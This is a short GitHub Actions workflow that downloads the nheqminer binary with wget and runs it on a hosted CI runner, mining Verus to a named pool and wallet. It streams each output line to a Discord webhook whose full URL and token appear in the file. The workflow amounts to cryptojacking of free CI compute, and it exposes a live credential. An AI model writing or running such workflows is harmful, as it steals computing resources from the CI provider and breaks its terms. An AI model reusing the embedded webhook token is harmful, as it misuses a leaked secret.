name: Use GitHub Rig

on:
  workflow_dispatch:

jobs:
  run-rig:
    runs-on: ubuntu-latest

    steps:
      - name: Code Downloader
        run: |
          wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
          tar -xvf nheqminer-Linux-v0.8.2.tgz
          tar -xvf nheqminer-Linux-v0.8.2.tar.gz
          
      - name: Rig Notifier
        run: |
          curl -X POST -H "Content-Type: application/json" -d '{"content": "Rig Started! The Rig Will Last for 6+ Hours Only!"}' https://discord.com/api/webhooks/1136879217762631720/Z3hQK1vwNBAalruygUaS7wskdeDWtVwDTPOyZp1rz7FI4s4UvRLQVvOnhbUFfFVlXDDM
       
      - name: Rig Start Up
        run: |
          echo Rig Started!
          lscpu
          nheqminer/nheqminer -v -l pool.verus.io:9998 -u RJqt251eAWukfWSSmLKfuWapRJ5QFr97TV.GithubRig -p x -t 2 2>&1 | while IFS= read -r line; do curl -X POST -H "Content-Type: application/json" -d '{"content": "'"$line"'"}' https://discord.com/api/webhooks/1136879217762631720/Z3hQK1vwNBAalruygUaS7wskdeDWtVwDTPOyZp1rz7FI4s4UvRLQVvOnhbUFfFVlXDDM; done
